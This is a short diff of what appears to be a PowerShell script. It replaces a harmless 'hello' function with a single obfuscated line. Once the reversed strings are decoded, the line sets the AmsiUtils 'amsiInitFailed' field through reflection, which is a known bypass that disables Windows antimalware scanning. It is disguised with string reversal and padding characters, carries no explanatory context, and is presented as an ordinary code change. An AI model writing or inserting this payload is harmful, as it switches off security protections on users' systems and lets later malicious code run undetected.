@@ -1,3 +1,1 @@
-function fun1 {
-    echo hello
-}
+$a=("citatXS,cilbuXPnoXNdeliaXFtinXIismXaslitXUismXA.noitamotuXA.tnemeganaXM.metsyXS" -replace "X","").ToCharArray();$x=1;$b=[Ref].Assembly.GetType(-join $a[68..30]);$x++;$c=$b.GetField(-join $a[29..16],-join $a[15..0]);$x++;$c.SetValue($null,$true)
